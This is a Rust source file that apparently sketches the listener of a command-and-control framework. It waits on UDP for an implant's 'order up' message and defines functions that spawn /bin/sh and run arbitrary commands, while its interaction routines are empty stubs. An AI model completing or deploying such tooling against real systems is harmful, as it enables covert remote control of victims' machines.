use std::process::Command;
use std::net::{UdpSocket, SocketAddr, TcpListener};

//pub struct info {
//  arch: String,
//  os: String,
//  hostname: String,
//}

pub struct Listener {
    udp_sock: UdpSocket,
    tcp_sock: TcpListener,
    id: u64,
    // 0 for idle, 1 for listening, 2 for connected
    status: u8,
}

pub fn lsn_run(lsn: &mut Listener, protocol: &str, address: SocketAddr){
    match protocol {
        "udp" => listen_udp(lsn, address),
        "tcp" => listen_tcp(lsn, address),
        "http" => listen_tcp(lsn, address),
        "dns" => listen_udp(lsn, address),
        &_ => todo!(),
    }
}

    // listens using a TcpListener
pub fn listen_tcp(lsn: &mut Listener, address: SocketAddr){
    println!("[+] Opening tcp listener on port {}", address.port());
}

// listens using a UdpSocket
pub fn listen_udp(lsn: &mut Listener, address: SocketAddr){
    lsn.status = 1;
    lsn.udp_sock = UdpSocket::bind(address).unwrap();
    println!("[+] Opening udp listener on port {}", address.port());
    loop { // break loop if connection is made
        let mut buffer = [0; 2048];
        let (bytes, src) = lsn.udp_sock.recv_from(&mut buffer).unwrap();

        // replace insides of .contains() with whatever string/key we are using to verify connection
        if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order up") {
            lsn.status = 2;
            // call a seperate function which interacts with the target
            // that way, if the target connection ends, the listener just
            // automatically goes back to listening
            // pass src to this function (which contains the implant's IP as a SocketAddr struct)
            interact_udp(lsn, src);
        }
        lsn.status = 1;
    }
    lsn.status = 0;
}

fn interact_udp(lsn: &mut Listener, target: SocketAddr) {
    // TODO
}

fn interact_tcp(lsn: &mut Listener, target: SocketAddr) {
    // TODO
}

// creates a shell on the target
pub fn shell() {
    if let Ok(command) = Command::new("/bin/sh").output(){
        println!("{}", String::from_utf8_lossy(&command.stdout));
    }
}

// executes a single arbitrary command
pub fn execute_cmd(s: String) -> String {
    if s.contains(' ') {
        let mut split = s.split_whitespace();
        let head = split.next().unwrap();
        let tail: Vec<&str> = split.collect();
        let cmd = Command::new(head).args(tail).output().unwrap();
        return String::from_utf8(cmd.stdout).expect("Found invalid UTF-8");
    }
    else {
        let cmd = Command::new(s).output().unwrap();
        return String::from_utf8(cmd.stdout).expect("Found invalid UTF-8");
    }
}
